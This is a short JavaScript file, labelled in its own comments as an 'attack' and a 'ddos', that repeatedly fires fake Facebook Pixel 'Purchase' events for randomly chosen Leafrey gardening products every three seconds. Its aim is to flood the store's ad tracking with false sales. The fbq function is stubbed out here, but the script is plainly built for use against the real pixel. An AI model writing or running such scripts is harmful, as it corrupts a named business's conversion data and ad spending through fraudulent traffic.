
const fbq = () => {}

// basic attack
fbq('track', 'Purchase', {
    content_type: 'product_group',
    content_ids: [6213501190339],
    value: 129.97,
    num_items: 1,
    content_name: 'Leafrey FarmGarden - 1 FarmGarden',
    currency: 'USD'
});

// ddos with random products
function getRandomItem() {
    const items = [
        {
            content_type: 'product_group',
            content_ids: [6213501190339],
            value: 129.97,
            num_items: 1,
            content_name: 'Leafrey FarmGarden - 1 FarmGarden',
            currency: 'USD'
        },
        {
            content_type: 'product_group',
            content_ids: [6210807201987],
            value: 79.97,
            num_items: 1,
            content_name: 
            'Leafrey Portable Greenhouse - 1',
            currency: 'USD'
        },
        {
            content_type: 'product_group',
            content_ids: [6193292280003],
            value: 12.97,
            num_items: 1,
            content_name: 
            'Leafrey Grow Lightbulb (Buy More, Save More)',
            currency: 'USD'
        },
        {
            content_type: 'product_group',
            content_ids: [6194520424643],
            value: 79.97,
            num_items: 1,
            content_name: 'Leafrey Hanging Grow Light',
            currency: 'USD'
        },
        {
            content_type: 'product_group',
            content_ids: [6235176173763],
            value: 39.97,
            num_items: 1,
            content_name: 'Portable Garden Fountain - Solar Panel Powered',
            currency: 'USD'
        },
        {
            content_type: 'product_group',
            content_ids: [6193346281667],
            value: 29.97,
            num_items: 1,
            content_name: 'Leafrey Halo Grow Light',
            currency: 'USD'
        },
        {
            content_type: 'product_group',
            content_ids: [6217934176451],
            value: '19.97',
            num_items: 1,
            content_name: 'LED Waterproof Grow Strip Lights - 1',
            currency: 'USD'
        }
  ]
return items[Math.floor(Math.random()*items.length)];
     
}

let count = 0
setInterval(() => {
    console.log(`Attacking pixel for the ${count+1} time.`)
    fbq('track', 'Purchase', getRandomItem());
    count++
}, 3000)


